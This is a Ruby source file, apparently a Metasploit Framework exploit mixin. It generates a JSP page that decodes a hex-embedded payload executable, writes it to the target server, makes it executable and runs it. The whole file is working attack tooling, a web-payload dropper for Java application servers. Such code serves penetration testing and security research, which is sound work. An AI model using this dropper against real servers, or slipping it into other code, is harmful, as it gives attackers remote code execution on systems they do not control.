# -*- coding: binary -*-

###
#
# This module exposes a simple method to create an payload in an executable.
#
###

module Msf
module Exploit::JspEXE
  include Exploit::EXE

  require 'msf/core/payload'
  require 'msf/core/payload/jsp'
  include Payload::Jsp

  def get_write_exec_payload(opts={})
    bin_name = Rex::Text.rand_text_alpha(8)
    if opts[:writable_path]
      bin_name = [opts[:writable_path], bin_name].join("/")
    else
      bin_name = "./#{bin_name}"
    end

    if target["Platform"] == 'win'
      bin_name << ".exe"
      print_warning("Unable to clean up #{bin_name}, delete it manually")
    end

    jsp = %Q|
    <%@ page import="java.io.*" %>
    <%
      String data = "#{Rex::Text.to_hex(generate_payload_exe, "")}";
      FileOutputStream outputstream = new FileOutputStream("#{bin_name}");
      int numbytes = data.length();
      byte[] bytes = new byte[numbytes/2];
      for (int counter = 0; counter < numbytes; counter += 2) {
        char char1 = (char) data.charAt(counter);
        char char2 = (char) data.charAt(counter + 1);
        int comb = Character.digit(char1, 16) & 0xff;
        comb <<= 4;
        comb += Character.digit(char2, 16) & 0xff;
        bytes[counter/2] = (byte)comb;
      }
      outputstream.write(bytes);
      outputstream.close();

      try {
        Runtime.getRuntime().exec("chmod +x #{bin_name}");
        Runtime.getRuntime().exec("#{bin_name}");
      } catch(IOException ioe) { }
    %>
    |

    jsp.gsub!(/\n/, ' ')

    jsp
  end



end
end
